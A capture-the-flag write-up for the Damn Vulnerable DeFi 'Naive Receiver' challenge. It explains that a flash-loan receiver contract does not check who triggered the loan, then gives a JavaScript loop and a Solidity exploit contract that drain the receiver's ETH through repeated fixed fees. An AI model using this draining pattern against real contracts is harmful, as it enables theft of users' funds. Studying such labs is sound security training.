## What is our mission
There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

<br/>

## What are the smart contracts 
- **`NaiveReceiverLenderPool.sol`**: smart contract that includes **`flashLoan()`** function
- **`FlashLoanReceiver.sol`**: smart contract that includes **`onFlashLoan()`** function

<br/>


## Solution 

**1.** **`NaiveReceiverLenderPool.sol`** contracts **`flashLoan()`** function
``` solidity
// NaiveReceiverLenderPool.sol

function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if(receiver.onFlashLoan(
            msg.sender,
            ETH,
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }
```

**2.** **`FlashLoanReceiver.sol`** contracts **`onFlashLoan()`** function

``` solidity
// FlashLoanReceiver.sol

function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }
```

**3.** The vulnarability cames from,  **`FlashLoanReceiver.sol`** contract.

**`onFlashLoan()`** function is triggered from `NaiveReceiverLenderPool.sol` when **`flashLoan()`** is called.



⚠️ But **`onFlashLoan()`** function doesn't check Who has called **`flashLoan()`** function.

This means anybody who call **`flashLoan()`** function can pass  **`FlashLoanReceiver.sol`** contract as a `receiver` paremether to **`flashLoan()`** function. This will trigger **`onFlashLoan()`** function inside **`FlashLoanReceiver.sol`**.

And **`FlashLoanReceiver`** will pay transection fee until be out of money. 😥😥😥

<br/>

Here how you can do it

```js
// test/naive-receiver/naive-receiver.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
               
        const ETH = await pool.ETH();
        
        for (let i = 0; i < 10; i++) 
        {    
            await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");   
        }        
    });
```
As you can see, we have send 10 transection. But if you want to do this challenge **in single transection**, you will need to code smart contract.

<br/><br/>


To solve this, create a new file in side **`contracts/naive-receiver`** called **`NaiveReceiver_SolutionCode.sol`** 

``` solidity
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract NaiveReceiver_SolutionCode
{
    // Constant variables
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant Amount = 1 ether; 

    // Immutable variables
    IERC3156FlashLender private immutable pool;
    IERC3156FlashBorrower private immutable receiver;

    // constructor
    constructor(address _pool, address _receiver) 
    {
        pool = IERC3156FlashLender(_pool);
        receiver = IERC3156FlashBorrower(_receiver);
    }

    
    function Exploit() external
    {
        for (uint i = 0; i < 10; i++) 
        {
            pool.flashLoan(receiver, ETH, Amount, "0x");    
        }
    }
}
```
Your contracts will be compiled, when you run the test.

<br/>

Then you can go to test file and use this code: 

```js
// test/unstoppable/unstoppable.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
               
        //Location of your compiled contract data. If you are fallowing this solition, copy bellow
        const compiled_data = require("../../artifacts/contracts/naive-receiver/NaiveReceiver_SolutionCode.sol/NaiveReceiver_SolutionCode.json");

        const abi = compiled_data.abi;
        const bytecode = compiled_data.bytecode;
    
        const factory = new ethers.ContractFactory(abi, bytecode, deployer);

        const NaiveReceiver_SolutionCode = await factory.deploy(pool.address, receiver.address)

        await NaiveReceiver_SolutionCode.Exploit();
    });
```



<br/>

## How could this exploit be prevented ?
**Share your ideas with me :)**


<br/>


## How to test it
got to ➡️ [**Damn Vulnerable Defi - Chalange #2**](https://www.damnvulnerabledefi.xyz/challenges/2.html). Clone the repository as mentioned and,

put [**basic solution code**](Basic.Solution.md) to his place 

/or

put [**single transection solution code**](Single.Transection.Solution.md) to his place

Then you can just type **`npm run naive-receiver`** 